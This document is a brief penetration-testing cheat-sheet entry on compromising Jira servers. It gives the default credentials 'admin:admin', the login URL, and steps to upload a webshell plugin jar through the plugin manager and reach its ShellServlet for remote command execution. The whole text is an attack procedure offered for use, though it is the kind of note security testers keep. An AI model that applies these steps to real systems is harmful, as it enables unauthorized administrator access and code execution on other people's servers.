# Web applications - CMS - Jira

### Login prompt & default credentials

Access the logon prompt at and try the default SDK credentials `admin:admin`

```
<http | https>://<HOST | IP>/login.jsp
```

### Administrator interface to RCE

Upload the `atlassian-webshell-plugin\atlplug.jar` through the admin web
interface:

```
<http | https>://<HOST | IP>/plugins/servlet/upm
```

Then start and access it to execute command:

```
<http | https>://<HOST | IP>/plugins/servlet/com.jsos.shell/ShellServlet
```
